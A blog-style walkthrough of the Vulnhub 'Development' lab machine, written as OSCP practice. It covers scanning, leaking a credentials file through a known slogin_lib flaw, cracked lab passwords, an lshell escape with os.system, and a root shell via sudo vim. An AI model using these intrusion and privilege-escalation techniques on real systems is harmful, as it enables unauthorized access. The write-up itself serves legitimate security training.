---
title: "Development"
date: 2022-04-13T02:50:29+08:00
draft: false
tags: ["Vulnhub"]
---

This machine reminds us of a DEVELOPMENT environment: misconfigurations rule the roost. This is designed for OSCP practice, and the original version of the machine was used for a CTF. It is now revived, and made more nefarious than the original. Development is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click [here](https://www.vulnhub.com/entry/digitalworldlocal-development,280/).

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.

> The machine IP address is `192.168.50.132` for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine.

## Scanning

```
sudo nmap -sS -p- 192.168.50.132 -oN initial.scan
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-12 14:55 EDT
Nmap scan report for 192.168.50.132
Host is up (0.0020s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
113/tcp  open  ident
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 4.37 seconds
```

From the scan, it tells us that several port is open: 

- SSH = Port 22
- iDent = Port 113
- Samba = Port 139 and 445
- HTTP = Port 8080

## Enumeration

#### Port 8080 (HTTP)

> Doing enumeration in this machine initially was painful because of the IDS. Any brute-forcing on the web will ban us from doing anything for a few minutes.

Navigating to port 8080 will bring us to the `Development Page`. Viewing the source code, there's a comment section where it tells us to look for the development secret page. So I navigate to /html_pages to see what I can find there. 

{{<image src="/Development/1.png" position="center" style="border-radius: 8px;">}}

Heading to `/development.html` while still in `view-source` mode, I can see a comment section, which points me to `/developmentsecretpage`.

Heading to `/developmentsecretpage`, i can access to Patrick PHP page by clicking on the hyperlink. Upon clicking on it, I was signed in even without specifying any credentials. There's also a `Click here to log out` hyperlink, which will log us out from the page and login page can be seen after clicking on it. 

{{<image src="/Development/2.png" position="center" style="border-radius: 8px;">}}

When attempt to log in with any credential, instead of error or any fail message, we are able to sign in. I also get an error message display on the site upon login in:

```
Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335

Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 336
```

## Initial Foothold 

#### Sensitive Data Disclosure

Searching a vulnerability for `slogin_lib.inc.php` lead to this: https://www.exploit-db.com/exploits/7444

This vulnerability expose the system to `Remote File Inclusion` and `Sensitive Data Disclosure` but, we are interested in the latter. Login information are stored in a text file. The name of this file is set in `slogin_lib.inc.php`, which by default is `slog_users.txt`. 

So, navigating to `http://192.168.50.132:8080/developmentsecretpage/slog_users.txt` will give us the login information: 

{{<image src="/Development/3.png" position="center" style="border-radius: 8px;">}}

Cracking the hash using this [tool](https://hashes.com/en/decrypt/hash) from the internet will give me their password in clear text except for the user `admin`:

intern:4a8a2b374f463b7aedbb44a066363b81 - **12345678900987654321**
patrick:87e6d56ce79af90dbe07d387d3d0579e - **P@ssw0rd25**
qiu:ee64497098d0926d198f54f6d5431f98 - **qiu**

With this credential, i can now login as `intern` through SSH:

```
ssh intern@192.168.50.132
intern@192.168.50.132's password: 12345678900987654321
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-34-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  3 21:00:18 UTC 2021

  System load:  0.02               Processes:            108
  Usage of /:   28.8% of 19.56GB   Users logged in:      0
  Memory usage: 24%                IP address for ens18: 192.168.50.132
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

32 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Aug  3 20:59:11 2021 from 10.10.10.2
Congratulations! You tried harder!
Welcome to Development!
Type '?' or 'help' to get the list of allowed commands
intern:~$
```

#### Breaking out from Restricted Shell

Upon ssh in to the machine, I can only use a few commands. This is known as `restricted shell`. By typing `?`, i can see the list of allowed commands: 

```
intern:~$ ls
access	local.txt  work.txt
intern:~$ cat local.txt
*** unknown syntax: cat
intern:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
intern:~$
```

When i enter the `id` command, I was kicked out from the shell, along with a error message. An error message from `lshell.py`. `lshell.py` is a python based shell that enables to restrict commands for users.

```
intern:~$ id
Traceback (most recent call last):
  File "/usr/local/bin/lshell", line 27, in <module>
    lshell.main()
  File "/usr/local/lib/python2.7/dist-packages/lshell.py", line 1165, in main
    cli.cmdloop()
  File "/usr/local/lib/python2.7/dist-packages/lshell.py", line 385, in cmdloop
    stop = self.onecmd(line)
  File "/usr/local/lib/python2.7/dist-packages/lshell.py", line 503, in onecmd
    func = getattr(self, 'do_' + cmd)
  File "/usr/local/lib/python2.7/dist-packages/lshell.py", line 134, in __getattr__
    if self.check_path(self.g_line) == 1:
  File "/usr/local/lib/python2.7/dist-packages/lshell.py", line 303, in check_path
    item = re.sub('^~', self.conf['home_path'], item)
  File "/usr/lib/python2.7/re.py", line 155, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
Connection to 192.168.50.132 closed.
```

Googling `lshell.py escape` on the internet will lead us to this website: https://www.aldeid.com/wiki/Lshell. Under the Security section, there's a way to bypass lshell with os.system by using the `echo` command. Doing this will bypass the restricted shell and we are free to use whatever commands:  

```
intern:~$ echo os.system('/bin/bash')
intern@development:~$ id
uid=1002(intern) gid=1006(intern) groups=1006(intern)
intern@development:~$ cat local.txt 
Congratulations on obtaining a user shell. :)
intern@development:~$
```

## Privileged Escalation 

#### Intern to Patrick 

This is easy. We crack the password earlier with the online tool. Just switch user and ta-da !

```
intern@development:~$ su patrick 
Password: 
patrick@development:/home/intern$ id
uid=1001(patrick) gid=1005(patrick) groups=1005(patrick),108(lxd)
```

#### Patrick to Root 

I believe there's a few way on getting root from here. Running the command `id` show us that patrick is in `lxd` group. Running the command `sudo -l` tell us that patrick can run `vim` and `nano` as sudo too: 

```
patrick@development:/home/intern$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
patrick@development:/home/intern$
```

Since `vim` can run as sudo, i will get root by simply doing this: 

```
patrick@development:/home/intern$ sudo vim -c ':!/bin/bash'

root@development:/home/intern# id
uid=0(root) gid=0(root) groups=0(root)
root@development:/home/intern# cd /root
root@development:/root# ls
iptables-rules  lshell-0.9.9  proof.txt  smb.conf  tcpdumpclock.sh
root@development:/root# cat proof.txt 
Congratulations on rooting DEVELOPMENT! :)
root@development:/root#
```

## Summary 

My 3rd machine from Vulnhub ! I say from this machine, i spend a lot of time on Port 8080 during enumeration due to IDS kicks in. I believe i trigger it when i tried to brute-forcing directory. RShell is something new to me too. This machine taught me to actually search for `slogin_lib.inc.php` and `lshell.py`. If I have not done this, I will stuck here for hours and eventually will read the walkthrough. 

I believe from Patrick to Root is supposed to be challenging but the online hash cracker made it easy. I think the author wanted us to create our own password dictionary from the hint in the `securitynotice.php`. Patrick password is `P@ssw0rd25`. He suggested to use password like `P@ssw0rd1`. The password expires every 30 days and he has been working for about 2 years + now. So its safe to assume that the number 25 in his password are actually his years in the company ! 25 months = 2 years 1 month. Or maybe I'm just overthinking ! See you in the next post !  
